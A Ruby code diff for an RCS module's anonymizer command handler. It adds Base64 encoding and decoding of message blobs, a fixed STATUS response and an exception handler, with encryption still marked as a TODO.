@@ -1,3 +1,4 @@
+require 'base64'
 
 require 'rcs-common/trace'
 
@@ -65,6 +66,8 @@ module RCS
         raise "Invalid received cookie" unless @anon
         trace :info, "Anonymizer '#{@anon['name']}' is sending a command..."
 
+        blob = Base64.decode64(blob)
+
         # TODO: retrieve the encryption keys and decrypt the blob
 
         blob = JSON.parse(blob)
@@ -83,7 +86,9 @@ module RCS
 
         # TODO: encrypt the message
 
-        return command
+        blob = Base64.encode64(command)
+
+        return blob
       end
 
       def protocol_command(command)
@@ -93,10 +98,13 @@ module RCS
         case command['command']
           when 'STATUS'
           when 'LOG'
-
         end
 
-        return STATUS_OK, command
+        response = {command: 'STATUS', result: {status: 'OK'}}
+
+        return STATUS_OK, response
+      rescue Exception => e
+        return STATUS_SERVER_ERROR, {command: 'STATUS', result: {status: 'ERROR', msg: e.message}}
       end
 
 
